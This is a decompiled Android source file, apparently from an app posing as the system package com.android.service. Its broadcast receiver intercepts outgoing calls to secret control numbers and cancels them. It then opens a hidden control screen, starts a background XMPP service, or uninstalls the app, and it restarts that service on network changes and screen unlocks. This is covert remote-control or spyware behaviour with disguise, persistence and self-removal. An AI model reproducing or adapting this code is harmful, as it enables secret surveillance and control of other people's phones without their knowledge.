package com.android.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.util.Log;
import com.boadcast.BroadcastRun;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.PresenceType;
import org.jivesoftware.smackx.packet.MessageEvent;

public class PhoneBroadcastReceiver extends BroadcastReceiver {
    private static final String netACTION = "android.net.conn.CONNECTIVITY_CHANGE";
    private AppPreferences _appPrefs;
    private Context mycontext = null;
    private String roleString = "";
    private String strDeleteControl = "";
    private String strMainControl = "";
    private String strMinerControl = "";
    private String strSelect_Mainnum = "";

    private Boolean getXmppConnectStatus(String strCheckTarget) {
        if (new PresenceType(this.mycontext).GetPresenceType(strCheckTarget).booleanValue()) {
            return Boolean.valueOf(true);
        }
        Log.e(MessageEvent.OFFLINE, MessageEvent.OFFLINE);
        return Boolean.valueOf(false);
    }

    public void onReceive(Context context, Intent intent) {
        BroadcastRun.BroadcastIntent(context, intent);
        this.mycontext = context;
        this._appPrefs = new AppPreferences(context);
        String strAction = intent.getAction();
        this.strMainControl = context.getString(R.string.mainControl);
        this.strMinerControl = context.getString(R.string.minerControl);
        this.strDeleteControl = context.getString(R.string.deleteControl);
        NetworkInfo info;
        Intent xmpp_service;
        if (strAction != null && strAction.equalsIgnoreCase("android.intent.action.NEW_OUTGOING_CALL")) {
            String number = getResultData();
            if (number != null && number.equalsIgnoreCase(this.strMainControl)) {
                setResultData(null);
                System.out.println("XMPP------------open");
                this.roleString = this._appPrefs.getBody();
                System.out.println("Role------------" + this.roleString);
                if (this.roleString.equalsIgnoreCase("m")) {
                    Intent MainControl = new Intent(context, MainControlActivity.class);
                    MainControl.setFlags(268435456);
                    context.startActivity(MainControl);
                }
            } else if (number != null && number.equalsIgnoreCase(this.strMinerControl)) {
                setResultData(null);
                try {
                    info = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                    if (info == null || !info.isConnected()) {
                        Log.d("mark", "没有可用网络");
                        return;
                    }
                    Log.d("mark", "当前网络名称：" + info.getTypeName());
                    this.roleString = this._appPrefs.getBody();
                    if (this.roleString.equalsIgnoreCase("b")) {
                        this.strSelect_Mainnum = this._appPrefs.getMainnum();
                        if (!getXmppConnectStatus(this.strSelect_Mainnum).booleanValue()) {
                            xmpp_service = new Intent(context, XmppService.class);
                            xmpp_service.setFlags(268435456);
                            context.startService(xmpp_service);
                        }
                    }
                } catch (Exception e) {
                }
            } else if (number != null && number.equalsIgnoreCase(this.strDeleteControl)) {
                setResultData(null);
                Intent uninstallIntent = new Intent("android.intent.action.DELETE", Uri.parse("package:com.android.service"));
                uninstallIntent.setFlags(268435456);
                context.startActivity(uninstallIntent);
            }
        } else if (strAction != null && strAction.equalsIgnoreCase(netACTION)) {
            try {
                info = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                if (info == null || !info.isConnected()) {
                    Log.d("mark", "没有可用网络");
                    return;
                }
                Log.d("mark", "当前网络名称：" + info.getTypeName());
                this.roleString = this._appPrefs.getBody();
                if (this.roleString.equalsIgnoreCase("b")) {
                    xmpp_service = new Intent(context, XmppService.class);
                    xmpp_service.setFlags(268435456);
                    context.startService(xmpp_service);
                }
            } catch (Exception e2) {
            }
        } else if (strAction != null && strAction.equalsIgnoreCase("android.intent.action.USER_PRESENT")) {
            try {
                info = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
                if (info == null || !info.isConnected()) {
                    Log.d("mark", "没有可用网络");
                    return;
                }
                Log.d("mark", "当前网络名称：" + info.getTypeName());
                this.roleString = this._appPrefs.getBody();
                if (this.roleString.equalsIgnoreCase("b")) {
                    this.strSelect_Mainnum = this._appPrefs.getMainnum();
                    if (!getXmppConnectStatus(this.strSelect_Mainnum).booleanValue()) {
                        xmpp_service = new Intent(context, XmppService.class);
                        xmpp_service.setFlags(268435456);
                        context.startService(xmpp_service);
                    }
                }
            } catch (Exception e3) {
            }
        }
    }
}
